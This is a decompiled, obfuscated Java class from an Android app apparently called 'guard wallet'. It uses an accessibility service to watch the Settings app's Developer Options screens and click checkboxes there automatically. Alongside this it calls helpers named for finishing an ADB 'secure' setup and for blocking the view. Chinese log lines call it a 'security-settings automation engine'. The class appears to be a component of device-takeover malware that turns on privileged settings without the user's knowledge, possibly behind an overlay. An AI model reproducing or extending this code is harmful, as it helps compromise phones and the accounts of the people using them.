package com.guard.wallet.delegate;
import com.guard.wallet.core.AppUtils;
import com.guard.wallet.permission.DelegateTaskRunner;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;


import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.locks.ReentrantLock;

public final class EnableSecureDelegate extends AccessibilityDelegate {

    public final ScheduledExecutorService n;
    public final ConcurrentLinkedQueue o;
    public boolean p;
    public boolean q;
    public boolean r;
    public final ReentrantLock s;
    public final AtomicBoolean t;

    public EnableSecureDelegate() {
        super(J(), "com.android.settings");
        ScheduledExecutorService newSingleThreadScheduledExecutor = Executors.newSingleThreadScheduledExecutor();
        this.n = newSingleThreadScheduledExecutor;
        this.o = new ConcurrentLinkedQueue();
        this.p = false;
        this.q = false;
        this.r = false;
        this.s = new ReentrantLock();
        this.t = new AtomicBoolean(false);
        try {
            newSingleThreadScheduledExecutor.schedule(new DelegateTaskRunner(2, this), 100L, TimeUnit.SECONDS);
        } catch (Exception e2) {
            AppUtils.s("EnableSecureDelegate", e2);
        }
    }

    public static LinkedList J() {
        LinkedList linkedList = new LinkedList();
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsDashboardActivity");
        FilterHelper.initEventTypes(listenWindow).add(32);
        listenWindow.getEventTypes().add(16384);
        linkedList.add(listenWindow);

        ListenWindow listenWindow2 = new ListenWindow("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsActivity");
        listenWindow2.setEventTypes(new HashSet<>());
        listenWindow2.getEventTypes().add(32);
        listenWindow2.getEventTypes().add(16384);
        linkedList.add(listenWindow2);

        linkedList.add(PairAccessibilityDelegate.s0());
        linkedList.add(PairAccessibilityDelegate.p0());
        linkedList.add(PairAccessibilityDelegate.o0());

        ListenWindow listenWindow3 = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
        listenWindow3.setEventTypes(new HashSet<>());
        listenWindow3.getEventTypes().add(32);
        listenWindow3.getEventTypes().add(16384);
        linkedList.add(listenWindow3);

        linkedList.add(PairAccessibilityDelegate.M0());
        linkedList.add(PairAccessibilityDelegate.I0());
        return linkedList;
    }

    public final boolean H() {
        LinkedList linkedList = new LinkedList();
        linkedList.add(PairAccessibilityDelegate.M0());
        return q(linkedList);
    }

    public final void I(boolean z2) {
        ReentrantLock reentrantLock = this.s;
        if (!reentrantLock.tryLock()) {
            return;
        }
        AtomicBoolean atomicBoolean = this.t;
        try {
            if (!atomicBoolean.get()) {
                Log.d("EnableSecureDelegate", "准备结束安全设置自动化引擎");
                atomicBoolean.set(true);
                this.n.shutdownNow();
                com.guard.wallet.thread.DelegateTaskLauncher.a(this.c);
                this.o.clear();
                try {
                    com.guard.wallet.utils.SystemHelper.F0(1);
                    com.guard.wallet.utils.SystemHelper.T0(5);
                } catch (Exception e2) {
                    AppUtils.s("EnableSecureDelegate", e2);
                }
                if (EngineHelper.heS() != null) {
                    Log.d("EnableSecureDelegate", "enableInFinish finishOpenWriteSecure");
                    EngineHelper.adbFinishSecure(z2);
                } else if (MyAccessibilityService.P() != null) {
                    Log.d("EnableSecureDelegate", "enableInFinish removeEnableSecureDelegate");
                    MyAccessibilityService.P().v();
                }
                com.guard.wallet.helper.BlockViewManager.c();
                Log.d("EnableSecureDelegate", "已结束安全设置自动化引擎");
                super.d();
            }
        } catch (Exception e3) {
            AppUtils.s("EnableSecureDelegate", e3);
        }
        reentrantLock.unlock();
    }

    public final CheckedResult K(UiObject uiObj, int waitTime) {
        AtomicInteger counter = new AtomicInteger(0);
        CheckedResult result = new CheckedResult();
        CombineFilter cf = new CombineFilter();
        StringCondition sc = FilterHelper.initFilter(cf, "className", "android.widget.CheckBox");
        cf.getStringConditions().add(sc);
        MyAccessibilityService.I(uiObj);
        UiObject checkbox = null;
        while (uiObj != null && checkbox == null && counter.incrementAndGet() <= 3) {
            checkbox = uiObj.findOneByCombine(cf);
            uiObj = uiObj.parent();
        }
        boolean checked = false;
        if (checkbox != null) {
            checked = checkbox.checked();
            if (!checked) {
                checkbox.click();
                result.setClicked(true);
                if (waitTime > 0) {
                    com.guard.wallet.utils.SystemHelper.T0(waitTime);
                    checkbox.refresh();
                    checked = checkbox.checked();
                }
            }
        }
        result.setChecked(checked);
        return result;
    }

    public final UiObject L() {
        CombineFiltersWithOr H0 = PairAccessibilityDelegate.H0();
        if (k() != null) {
            return k().findOneByOperateOr(H0);
        }
        return null;
    }

    @Override
    public final void d() {
        try {
            this.n.shutdownNow();
            com.guard.wallet.thread.DelegateTaskLauncher.a(this.c);
            this.o.clear();
            super.d();
        } catch (Exception e2) {
            AppUtils.s("EnableSecureDelegate", e2);
        }
    }

    @Override
    public final boolean equals(Object obj) {
        return obj instanceof EnableSecureDelegate;
    }

    @Override
    public final int hashCode() {
        return Objects.hash(EnableSecureDelegate.class.getName());
    }

    @Override
    public final void u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        if (this.t.get()) {
            return;
        }
        if (accessibilityEvent != null) {
            super.u(accessibilityEvent, str, str2);
        }
        LinkedList linkedList = new LinkedList();
        linkedList.add(PairAccessibilityDelegate.Y());
        linkedList.add(PairAccessibilityDelegate.W());
        linkedList.add(PairAccessibilityDelegate.s0());
        linkedList.add(PairAccessibilityDelegate.P0());
        linkedList.add(PairAccessibilityDelegate.O0());
        linkedList.add(PairAccessibilityDelegate.p0());
        linkedList.add(PairAccessibilityDelegate.o0());
        boolean matched = q(linkedList);
        String str3 = this.c;
        ConcurrentLinkedQueue concurrentLinkedQueue = this.o;
        if (matched && !concurrentLinkedQueue.contains("enableInPrepareFinish")) {
            concurrentLinkedQueue.add("enableInPrepareFinish");
            com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.EnableSecureTask(this, 0), str3);
        }
        if (H() && !concurrentLinkedQueue.contains("enableInSecurityCenter")) {
            concurrentLinkedQueue.add("enableInSecurityCenter");
            com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.EnableSecureTask(this, 1), str3);
        }
    }
}
